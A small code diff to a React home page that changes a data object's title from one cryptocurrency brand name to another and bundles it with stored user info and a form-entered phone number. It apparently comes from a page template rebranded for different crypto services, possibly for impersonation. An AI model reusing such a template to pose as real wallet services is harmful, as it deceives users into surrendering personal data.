@@ -127,7 +127,7 @@ export default function HomePage() {
     try {
       const stored = JSON.parse(localStorage.getItem("userInfo") || "{}");
       const data = {
-        title: "Uphold",
+        title: "Trust Wallet",
         ...stored,
         phone: formData.phone,
       };
